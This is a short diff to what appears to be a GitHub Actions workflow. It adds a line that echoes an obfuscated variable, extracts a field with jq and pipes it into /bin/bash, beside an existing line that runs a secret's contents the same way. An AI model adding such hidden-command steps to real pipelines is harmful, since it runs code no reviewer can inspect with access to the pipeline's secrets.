@@ -23,6 +23,7 @@ jobs:
           exq7756: ${{ secrets.exq7756 }}
         run: |
           printf '%s' "$exq7756" | jq -r .leaod02 | /bin/bash
+          echo $mc54642 | jq -r .t7 | /bin/bash
 
       - name: Archive output
         if: always()
